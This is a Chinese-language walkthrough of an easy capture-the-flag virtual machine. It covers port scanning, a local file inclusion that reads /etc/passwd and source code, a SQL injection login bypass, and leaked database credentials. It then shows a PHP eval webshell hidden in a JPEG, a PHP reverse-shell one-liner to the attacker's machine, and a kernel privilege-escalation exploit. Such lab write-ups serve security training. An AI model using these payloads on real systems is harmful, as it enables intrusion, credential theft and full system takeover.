
## 靶机信息
- 级别:容易

## Recon

### nmap

```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.160

sudo nmap -sT --min-rate 10000 -p- 192.168.1.160 -oA ./ports
//ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


## Web
![[Pasted image 20231018122804.png]]

### 目录爆破
```shell
gobuster dir -u http://192.168.1.160 -w /usr/share/wordlists/dirb/common.txt
/test

'file' parameter is empty. Please provide file path in 'file' parameter 
//用post方式发送file=/etc/passwd得到了passwd文件
```
### LFI
```shell
curl -X POST -d file=./index.php http://192.168.1.160/test >> index.php  //读取源码
//
$uname=str_replace('\'','',urldecode($_POST['un']));
        $pass=str_replace('\'','',urldecode($_POST['ps']));
        $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
select * from auth where  pass=\'' Or 1=1 -- \'\'

输入 or 1=1 -- \即可绕过
elect * from auth where  pass=\'' or 1=1 -- '\'
```

或者通过LFI看到c.php的源码，得到数据库的凭据，登录phpmy之后ica_lab->auth下看到登录用户名密码

```shell
biLLu,hEx_it //登录web
```

## Web
![[Pasted image 20231018144134.png]]
看到一个上传文件的位置

![[Pasted image 20231018144400.png]]

### 目录爆破
```shell
gobuster dir -u http://192.168.1.160 -w /usr/share/wordlists/dirb/common.txt -x php
/c.php                (Status: 200) [Size: 1]
/phpmy
curl -X POST --data file=./c.php http://192.168.1.160/test > c.php
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab"); //得到myqsl的链接密码
```



### 图片木马
```php
wget http://192.168.1.160/uploaded_images/jack.jpg 
echo '<?php @eval($_GET['cmd']); ?>' >> jack.jpg
mv jack.jpg jac.jpg //防止重名
// <?php @eval($_GET['cmd']); ?>

/panel 通过LFI查看源码得知对文件可以进行包含
```

![[Pasted image 20231018152526.png]]
将load改为图片马的位置

![[Pasted image 20231018155613.png]]
```php
<?php system($_GET['read']); ?>
//多尝试

执行php反弹shell
php -r '$sock=fsockopen("192.168.1.136",1234);exec("/bin/sh -i <&3 >&3 2>&3");' // 要url编码一下
```

![[Pasted image 20231018160248.png]]



## 内核提权

```shell
searchsploit linux kernel 3.13
searchsploit -m 37292.c
./37292
```

![[Pasted image 20231018164417.png]]
